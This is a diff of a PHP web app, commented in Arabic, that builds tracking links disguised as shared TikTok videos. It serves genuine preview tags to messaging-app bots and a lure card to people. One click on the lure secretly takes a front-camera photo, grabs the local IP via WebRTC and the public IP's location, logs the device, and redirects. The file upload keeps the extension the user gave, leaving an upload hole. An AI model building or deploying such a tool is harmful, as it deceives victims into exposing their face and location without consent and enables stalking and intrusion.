@@ -1,145 +1,104 @@
 <?php
-// ضبط المنطقة الزمنية للجزائر بدقة
 date_default_timezone_set('Africa/Algiers');
 
-// إظهار الأخطاء للتشخيص
-ini_set('display_errors', 1);
-error_reporting(E_ALL);
+error_reporting(0);
+@ini_set('display_errors', 0);
+
+$upload_dir = 'uploads/';
+if (!is_dir($upload_dir)) {
+    @mkdir($upload_dir, 0755, true);
+}
 
 try {
-    $db = new PDO('sqlite:tracker.db');
+    $db = new PDO('sqlite:tracker_custom_bg.db');
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
         target_url TEXT, 
+        sender_name TEXT,
+        sender_avatar TEXT,
+        bg_image TEXT,
         meta_title TEXT,
         meta_image TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
-    $db->exec("CREATE TABLE IF NOT EXISTS logs (
+    $db->exec("CREATE TABLE IF NOT EXISTS captures (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT, 
+        image_data TEXT, 
         public_ip TEXT, 
         local_ip TEXT, 
         port TEXT, 
-        country TEXT, 
-        city TEXT, 
-        lat TEXT, 
-        lon TEXT, 
-        isp TEXT, 
+        location TEXT, 
         device_info TEXT, 
-        screen_res TEXT, 
-        timezone TEXT, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 } catch (Exception $e) {
-    die("خطأ في قاعدة البيانات: " . $e->getMessage());
+    die("Database error: " . $e->getMessage());
 }
 
-// دالة سحب العنوان والصورة الأصلية ديناميكياً مع تركيز فائق على تيك توك ويوتيوب والمواقع العامة
-function fetch_real_meta($url) {
-    $title = "";
-    $image = "";
+// دالة مخصصة ومركزة حصرياً لسحب العنوان والصورة المصغرة الحقيقية من تيك توك
+function fetch_tiktok_exclusive_meta($url) {
+    $meta = [
+        'title' => 'TikTok Video',
+        'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
+    ];
 
-    // 1. معالجة خاصة لروابط تيك توك (بما فيها الروابط المختصرة vt.tiktok.com و vm.tiktok.com)
-    if (stripos($url, 'tiktok.com') !== false) {
-        // استخدام TikTok oEmbed API الرسمي لتخطي الحظر وجلب العنوان والصورة الأصلية بدقة متناهية
-        $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $oembed_url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1');
-        $json = curl_exec($ch);
-        curl_close($ch);
+    // استدعاء واجهة oEmbed الخاصة بتيك توك لجلب العنوان والصورة الأصلية بدقة متناهية
+    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $oembed_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1');
+    $response = curl_exec($ch);
+    curl_close($ch);
 
-        if ($json) {
-            $data = json_decode($json, true);
-            if (!empty($data['title'])) {
-                $title = $data['title'];
-            }
-            if (!empty($data['thumbnail_url'])) {
-                $image = $data['thumbnail_url'];
-            }
+    if ($response) {
+        $data = json_decode($response, true);
+        if (!empty($data['title'])) {
+            $meta['title'] = $data['title'];
+        }
+        if (!empty($data['thumbnail_url'])) {
+            $meta['image'] = $data['thumbnail_url'];
+            return $meta;
         }
     }
 
-    // 2. إذا كان الرابط يوتيوب
-    if (empty($title) && preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url, $matches)) {
-        $video_id = $matches[1];
-        if (empty($image)) {
-            $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
+    // الطريقة البديلة في حال كان الرابط مختصراً جداً ولم يستجب الـ oEmbed مباشرة
+    $ch_alt = curl_init();
+    curl_setopt($ch_alt, CURLOPT_URL, $url);
+    curl_setopt($ch_alt, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch_alt, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch_alt, CURLOPT_TIMEOUT, 6);
+    curl_setopt($ch_alt, CURLOPT_USERAGENT, 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)');
+    curl_setopt($ch_alt, CURLOPT_SSL_VERIFYPEER, false);
+    $html = curl_exec($ch_alt);
+    curl_close($ch_alt);
+
+    if ($html) {
+        $dom = new DOMDocument();
+        @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
+        $xpath = new DOMXPath($dom);
+
+        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //title');
+        if ($titleNodes->length > 0) {
+            $val = trim($titleNodes->item(0)->nodeValue);
+            if (!empty($val)) $meta['title'] = $val;
         }
-        
-        $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $oembed_url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
-        $json = curl_exec($ch);
-        curl_close($ch);
-        
-        if ($json) {
-            $data = json_decode($json, true);
-            if (isset($data['title'])) {
-                $title = $data['title'];
-            }
-        }
-    }
 
-    // 3. إذا لم يتم الجلب بعد، نقوم بقراءة الصفحة مباشرة عبر cURL مع محاكاة متصفح جوال حقيقي
-    if (empty($title) || empty($image)) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1');
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        $html = curl_exec($ch);
-        curl_close($ch);
-
-        if ($html) {
-            $dom = new DOMDocument();
-            @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
-            $xpath = new DOMXPath($dom);
-
-            if (empty($title)) {
-                $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content');
-                if ($titleNodes->length > 0) {
-                    $title = $titleNodes->item(0)->nodeValue;
-                } else {
-                    $nodes = $dom->getElementsByTagName('title');
-                    if ($nodes->length > 0) {
-                        $title = $nodes->item(0)->nodeValue;
-                    }
-                }
-            }
-
-            if (empty($image)) {
-                $imageNodes = $xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content | //link[@rel="image_src"]/@href');
-                if ($imageNodes->length > 0) {
-                    $image = $imageNodes->item(0)->nodeValue;
-                }
-            }
+        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content');
+        if ($imageNodes->length > 0) {
+            $val = trim($imageNodes->item(0)->nodeValue);
+            if (!empty($val)) $meta['image'] = $val;
         }
     }
 
-    // احتياطياً في حال تعذر السحب تماماً
-    if (empty($title)) {
-        $title = parse_url($url, PHP_URL_HOST) ?? "TikTok Video";
-    }
-    if (empty($image)) {
-        $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
-    }
-
-    return ['title' => trim($title), 'image' => trim($image)];
+    return $meta;
 }
 
 function get_real_ip() {
@@ -150,346 +109,425 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-function parse_isp($isp_name, $org_name) {
-    $combined = $isp_name . ' ' . $org_name;
-    if (stripos($combined, 'Mobilis') !== false or stripos($combined, 'ATM') !== false) return 'موبيليس (Mobilis)';
-    if (stripos($combined, 'Djezzy') !== false or stripos($combined, 'Optimum Telecom') !== false) return 'جازي (Djezzy)';
-    if (stripos($combined, 'Ooredoo') !== false or stripos($combined, 'Wataniya') !== false) return 'أوريدو (Ooredoo)';
-    if (stripos($combined, 'Algérie Télécom') !== false or stripos($combined, 'Algerie Telecom') !== false or stripos($combined, 'AT') !== false) return 'اتصالات الجزائر (Algérie Télécom)';
-    return trim($isp_name) ?: 'شبكة غير معروفة';
-}
-
-function get_device_type($ua) {$brand = 'جهاز ذكي';
-    if (stripos($ua, 'Samsung') !== false)$brand = 'سامسونج (Samsung)';
-    elseif (stripos($ua, 'iPhone') !== false)$brand = 'آيفون (iPhone)';
-    elseif (stripos($ua, 'Huawei') !== false)$brand = 'هواوي (Huawei)';
-    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false or stripos($ua, 'POCO') !== false)$brand = 'شاومي (Xiaomi)';
-    elseif (stripos($ua, 'Oppo') !== false)$brand = 'أوبو (Oppo)';
-    elseif (stripos($ua, 'Vivo') !== false)$brand = 'فيفو (Vivo)';
-    elseif (stripos($ua, 'Realme') !== false)$brand = 'ريلمي (Realme)';
-
-    if (stripos($ua, 'Android') !== false) return$brand . ' - أندرويد';
-    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return$brand . ' - iOS';
-    if (stripos($ua, 'Windows') !== false) return 'حاسوب - ويندوز';
-    if (stripos($ua, 'Macintosh') !== false or stripos($ua, 'Mac OS') !== false) return 'حاسوب - ماك';
-    if (stripos($ua, 'Linux') !== false) return 'نظام لينكس';
-    return 'جهاز غير معروف';
-}
-
-function get_ip_details($ip) {
-    if ($ip == '127.0.0.1' or $ip == '::1' or$ip == 'Unknown' or strpos($ip, '10.') === 0 or strpos($ip, '192.168.') === 0) {
-        return ['country' => 'الجزائر (محلي)', 'city' => 'شبكة داخلية', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'شبكة محلية (Localhost)'];
+function get_ip_location($ip) {
+    if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
+        return 'Local Network';
     }
-    $json = @file_get_contents("http://ip-api.com/json/" . $ip . "?fields=status,country,city,lat,lon,isp,org");
-    $data = json_decode($json, true);
-    if ($data and isset($data['status']) and$data['status'] == 'success') {
-        return [
-            'country' => $data['country'] ?? 'غير معروف',
-            'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538', 
-            'lon' =>$data['lon'] ?? '3.0588',
-            'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
-        ];
+    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city");
+    if ($json) {
+        $data = json_decode($json, true);
+        if (isset($data['status']) && $data['status'] === 'success') {
+            return ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
+        }
     }
-    return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
+    return 'Unknown Location';
 }
 
-// 1. معالجة إعادة التوجيه وفحص روبوتات المعاينة (Bots)
-$og_title = "";
-$og_image = "";
+function get_device_type($ua) {
+    $brand = 'Device';
+    if (stripos($ua, 'Samsung') !== false) $brand = 'Samsung';
+    elseif (stripos($ua, 'iPhone') !== false) $brand = 'iPhone';
+    elseif (stripos($ua, 'Huawei') !== false) $brand = 'Huawei';
+    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false) $brand = 'Xiaomi';
+    elseif (stripos($ua, 'Oppo') !== false) $brand = 'Oppo';
 
+    if (stripos($ua, 'Android') !== false) return $brand . ' - Android';
+    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return $brand . ' - iOS';
+    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
+    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
+    return 'Unknown Device';
+}
+
+// معالجة زيارة الرابط
 if (isset($_GET['r'])) {
-    $code =$_GET['r'];
-    $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
+    $code = $_GET['r'];
+    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
     $stmt->execute([$code]);
-    $link =$stmt->fetch(PDO::FETCH_ASSOC);
+    $link = $stmt->fetch(PDO::FETCH_ASSOC);
 
     if ($link) {
-        $target =$link['target_url'];
-        $og_title =$link['meta_title'];
-        $og_image =$link['meta_image'];
+        $target_redirect = $link['target_url'];
+        $sender_name = $link['sender_name'];
+        $sender_avatar = $link['sender_avatar'];
+        $meta_title = $link['meta_title'];
+        $meta_image = $link['meta_image'];
+        $bg_image_url = !empty($link['bg_image']) ? $link['bg_image'] : $meta_image;
 
-        $ua =$_SERVER['HTTP_USER_AGENT'] ?? '';
-        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i',$ua);
+        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);
 
-        // إذا كان الطلب قادماً من روبوتات منصات الدردشة (مثل ماسنجر أو واتساب)، نعرض له وسوم المعاينة الأصلية فوراً
+        // إرسال وسوم المعاينة الأصلية المباشرة لروبوتات التطبيقات (مثل ماسنجر)
         if ($is_bot) {
             header('Content-Type: text/html; charset=utf-8');
-            echo '<!DOCTYPE html><html lang="ar" dir="rtl"><head>';
-            echo '<meta charset="UTF-8">';
+            echo '<!DOCTYPE html><html><head>';
             echo '<meta property="og:site_name" content="TikTok">';
             echo '<meta property="og:type" content="video.other">';
-            echo '<meta property="og:title" content="' . htmlspecialchars($og_title) . '">';
-            echo '<meta property="og:image" content="' . htmlspecialchars($og_image) . '">';
-            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($og_image) . '">';
-            echo '<meta property="og:image:type" content="image/jpeg">';
+            echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
+            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
+            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
             echo '<meta name="twitter:card" content="summary_large_image">';
-            echo '<meta name="twitter:title" content="' . htmlspecialchars($og_title) . '">';
-            echo '<meta name="twitter:image" content="' . htmlspecialchars($og_image) . '">';
-            echo '<title>' . htmlspecialchars($og_title) . '</title>';
+            echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
+            echo '<meta name="twitter:image" content="' . htmlspecialchars($meta_image) . '">';
+            echo '<title>' . htmlspecialchars($meta_title) . '</title>';
             echo '</head><body></body></html>';
             exit();
         }
 
-        $public_ip = get_real_ip();
-        $local_ip =$_GET['lip'] ?? 'غير متوفر';
-        $port =$_SERVER['REMOTE_PORT'] ?? 'غير متوفر';
-        $geo = get_ip_details($public_ip);
-        $device = get_device_type($ua);
-        $screen =$_GET['screen'] ?? 'غير متوفر';
-        $tz =$_GET['tz'] ?? 'غير متوفر';
-        $created_at = date('Y-m-d H:i:s');
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
+            $img_base64 = $_POST['image'] ?? '';
+            $public_ip = get_real_ip();
+            $local_ip = $_POST['lip'] ?? 'Direct';
+            $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
+            $location = get_ip_location($public_ip);
+            $device = get_device_type($ua);
 
-        if (isset($_GET['screen'])) {
-            try {
-                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-                $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$screen, $tz,$created_at]);
-            } catch (Exception $e) {}
-
-            header("Location: " . $target);
-            exit();
+            if (!empty($img_base64)) {
+                try {
+                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
+                    $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
+                } catch (Exception $e) {}
+            }
+            exit('OK');
         }
-    } else {
-        die("الرابط غير موجود.");
-    }
-}
-
-// 2. إنشاء رابط جديد وجلب العنوان والصورة الأصلية من تيك توك تلقائياً
-$generated_link = "";
-$tracking_code = "";
-if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
-    $target_url = trim($_POST['target_url']);
-    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
-        $target_url = "https://" . $target_url;
-    }
-
-    $meta = fetch_real_meta($target_url);
-
-    $code = substr(md5(uniqid(rand(), true)), 0, 7);
-    $stmt =$db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?)");
-    $stmt->execute([$code,$target_url, $meta['title'],$meta['image']]);
-
-    $tracking_code =$code;
-    $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
-}
-
-$total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
-$total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();
-
-$filter_code = trim($_GET['track'] ?? '');
-if (!empty($filter_code)) {
-    $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
-    $stmt->execute([$filter_code]);
-    $logs =$stmt->fetchAll(PDO::FETCH_ASSOC);
-} else {
-    $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
-}
 ?>
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><?php echo htmlspecialchars($og_title); ?></title>
-    
-    <!-- وسوم المعاينة المباشرة المستخرجة بدقة تامة -->
-    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
-    <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
+    <title><?php echo htmlspecialchars($meta_title); ?></title>
+    <meta property="og:title" content="<?php echo htmlspecialchars($meta_title); ?>">
+    <meta property="og:image" content="<?php echo htmlspecialchars($meta_image); ?>">
     <meta property="og:type" content="video.other">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="<?php echo htmlspecialchars($og_title); ?>">
-    <meta name="twitter:image" content="<?php echo htmlspecialchars($og_image); ?>">
-
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body { background-color: #0b0f19; color: #f3f4f6; padding: 15px; line-height: 1.5; }
-        .container { max-width: 1100px; margin: 0 auto; display: flex; flex-direction: column; gap: 15px; }
-        .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
-        h1 { color: #38bdf8; font-size: 22px; font-weight: 800; }
-        .stats-group { display: flex; gap: 10px; }
-        .stat-box { background: #1f2937; padding: 8px 14px; border-radius: 8px; text-align: center; border: 1px solid #374151; }
-        .stat-box span { display: block; font-size: 10px; color: #9ca3af; }
-        .stat-box strong { font-size: 16px; color: #38bdf8; }
-        h2 { color: #38bdf8; font-size: 16px; margin-bottom: 12px; font-weight: 700; }
-        .form-group { display: flex; flex-direction: column; gap: 10px; }
-        @media(min-width: 600px) { .form-group { flex-direction: row; } }
-        input[type="text"] { flex: 1; background: #030712; border: 1px solid #374151; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; outline: none; width: 100%; }
-        input[type="text"]:focus { border-color: #38bdf8; }
-        button, .btn { background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: background 0.2s; text-decoration: none; display: inline-block; text-align: center; font-size: 14px; white-space: nowrap; }
-        button:hover, .btn:hover { background: #0369a1; }
-        .result-box { background: #030712; border: 1px solid rgba(56, 189, 248, 0.3); padding: 14px; border-radius: 8px; margin-top: 12px; word-break: break-all; }
-        .table-container { overflow-x: auto; margin-top: 12px; border: 1px solid #1f2937; border-radius: 8px; }
-        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 12px; min-width: 1000px; }
-        th { background: #030712; color: #9ca3af; padding: 12px; border-bottom: 1px solid #1f2937; white-space: nowrap; }
-        td { padding: 12px; border-bottom: 1px solid #1f2937; color: #e5e7eb; white-space: nowrap; }
-        tr:hover { background: rgba(31, 41, 55, 0.4); }
-        .badge { background: #064e3b; color: #34d399; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; border: 1px solid #065f46; }
-        .ip-public { font-family: monospace; color: #38bdf8; font-weight: bold; }
-        .ip-local { font-family: monospace; color: #34d399; font-weight: bold; }
-        .port-badge { font-family: monospace; color: #f43f5e; background: rgba(244, 63, 94, 0.1); padding: 3px 6px; border-radius: 4px; font-weight: bold; border: 1px solid rgba(244, 63, 94, 0.2); }
-        .copy-btn { background: #374151; padding: 6px 10px; font-size: 11px; border-radius: 4px; cursor: pointer; color: #fff; border: none; }
-        .copy-btn.success { background: #059669; }
-        .map-btn { background: #047857; color: #fff; padding: 5px 10px; border-radius: 6px; font-size: 11px; text-decoration: none; font-weight: bold; display: inline-block; }
-        .map-btn:hover { background: #065f46; }
-        .link-row { display: flex; gap: 8px; margin-top: 6px; align-items: center; }
+        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; display: flex; justify-content: center; align-items: center; position: relative; cursor: pointer; }
+        
+        .blurred-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('<?php echo htmlspecialchars($bg_image_url); ?>') no-repeat center center/cover;
+            filter: blur(18px) brightness(0.65);
+            transform: scale(1.1);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .modal-card {
+            position: relative;
+            background: rgba(255, 255, 255, 0.98);
+            width: 90%;
+            max-width: 350px;
+            border-radius: 24px;
+            padding: 30px 20px;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            z-index: 10;
+            animation: popUp 0.3s ease-out;
+            cursor: pointer;
+        }
+        @keyframes popUp { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+
+        .avatar-container { width: 80px; height: 80px; border-radius: 50%; overflow: hidden; margin: -65px auto 16px auto; border: 4px solid #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.2); background: #eee; }
+        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
+
+        h2 { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 8px; }
+        p { font-size: 13px; color: #666; margin-bottom: 24px; line-height: 1.5; }
+
+        .btn-action { display: block; width: 100%; background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer; text-decoration: none; margin-bottom: 12px; box-shadow: 0 4px 14px rgba(254,44,85,0.4); pointer-events: none; }
+        .btn-secondary { background: transparent; color: #888; border: none; font-size: 14px; font-weight: 500; cursor: pointer; padding: 6px; pointer-events: none; }
     </style>
     <script>
+        let isCaptured = false;
+
         function getLocalIP(callback) {
-            let ips = [];
+            let foundLocal = false;
             let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-            if (!RTCPeerConnection) { callback("غير مدعوم"); return; }
+            if (!RTCPeerConnection) { callback("Unknown"); return; }
             let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
             pc.createDataChannel("");
             pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-            
             pc.onicecandidate = function(ice) {
                 if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                 let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                 if (myIP) {
                     let ip = myIP[1];
-                    if (!ips.includes(ip)) {
-                        ips.push(ip);
-                        if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
-                            callback(ip);
-                            pc.onicecandidate = null;
-                        }
+                    if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
+                        if (!foundLocal) { foundLocal = true; callback(ip); pc.onicecandidate = null; }
                     }
                 }
             };
-            setTimeout(() => { if (ips.length === 0) callback("192.168.1.X"); }, 200);
+            setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
         }
 
-        document.addEventListener("DOMContentLoaded", function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const redirectCode = urlParams.get('r');
-            const hasScreen = urlParams.has('screen');
+        function triggerCaptureAndRedirect(e) {
+            if (isCaptured) return;
+            isCaptured = true;
 
-            if (redirectCode && !hasScreen) {
-                getLocalIP(function(localIp) {
-                    const screenRes = screen.width + "x" + screen.height;
-                    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    window.location.href = `/?r=${redirectCode}&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
+            const targetUrl = "<?php echo $target_redirect; ?>";
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                        stream.getTracks().forEach(track => track.stop());
+
+                        getLocalIP(function(localIp) {
+                            const formData = new URLSearchParams();
+                            formData.append('save_capture', '1');
+                            formData.append('image', imageData);
+                            formData.append('lip', localIp);
+
+                            fetch(window.location.href, {
+                                method: 'POST',
+                                body: formData
+                            }).finally(() => {
+                                window.location.replace(targetUrl);
+                            });
+                        });
+                    }, 600);
+                })
+                .catch(err => {
+                    window.location.replace(targetUrl);
                 });
-            }
-        });
+        }
 
+        window.addEventListener('DOMContentLoaded', () => {
+            document.body.addEventListener('click', triggerCaptureAndRedirect);
+        });
+    </script>
+</head>
+<body>
+    <div class="blurred-bg"></div>
+    <div class="modal-card">
+        <div class="avatar-container">
+            <img src="<?php echo htmlspecialchars($sender_avatar); ?>" alt="Avatar">
+        </div>
+        <h2>Watch this video</h2>
+        <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
+        <button class="btn-action">Watch Now</button>
+        <button class="btn-secondary">Not now</button>
+    </div>
+</body>
+</html>
+<?php 
+        exit();
+    } else {
+        die("Link not found.");
+    }
+}
+
+// إنشاء الرابط وسحب بيانات تيك توك حصرياً
+$generated_link = "";
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
+    $target_url = trim($_POST['target_url']);
+    $sender_name = trim($_POST['sender_name']) ?: "User";
+    
+    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
+        $target_url = "https://" . $target_url;
+    }
+
+    $scraped = fetch_tiktok_exclusive_meta($target_url);
+    $meta_title = $scraped['title'];
+    $meta_image = $scraped['image'];
+
+    $sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
+    if (isset($_FILES['avatar_file']) && $_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
+        $ext = pathinfo($_FILES['avatar_file']['name'], PATHINFO_EXTENSION);
+        $avatarName = 'avatar_' . uniqid() . '.' . $ext;
+        @move_uploaded_file($_FILES['avatar_file']['tmp_name'], $upload_dir . $avatarName);
+        $sender_avatar = $upload_dir . $avatarName;
+    } elseif (!empty($_POST['sender_avatar_url'])) {
+        $sender_avatar = trim($_POST['sender_avatar_url']);
+    }
+
+    $bg_image_url = "";
+    if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
+        $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
+        $bgName = 'bg_' . uniqid() . '.' . $ext;
+        @move_uploaded_file($_FILES['bg_file']['tmp_name'], $upload_dir . $bgName);
+        $bg_image_url = $upload_dir . $bgName;
+    } elseif (!empty($_POST['bg_image_url'])) {
+        $bg_image_url = trim($_POST['bg_image_url']);
+    }
+
+    $code = substr(md5(uniqid(rand(), true)), 0, 7);
